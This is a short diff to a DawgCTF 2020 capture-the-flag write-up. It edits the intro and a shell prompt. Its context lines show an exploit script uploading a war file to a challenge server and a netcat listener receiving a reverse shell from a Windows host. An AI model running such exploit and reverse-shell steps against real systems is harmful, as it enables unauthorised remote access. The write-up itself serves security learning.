@@ -1,5 +1,7 @@
 # DawgCTF 2020 – In ctrl + Percival PCAP Pandemonium
 
+These are multiple challenges connected together.
+
 ## In ctrl
 
 * **Category:** misc
@@ -212,7 +214,7 @@ m3ssap0@server:~$ python2 exploit.py percival4.ctf.umbccd.io m3ssap0.war "JSESSI
 At this point, visiting the `http://percival4.ctf.umbccd.io/m3ssap0` will spawn a shell on your listening server. You can now find the flag.
 
 ```
-ubuntu@ip-172-31-21-50:~$ nc -lvk 1337
+m3ssap0@server:~$ nc -lvk 1337
 Listening on [0.0.0.0] (family 0, port 1337)
 Connection from ec2-52-202-94-107.compute-1.amazonaws.com 49557 received!
 Microsoft Windows [Version 6.1.7601]
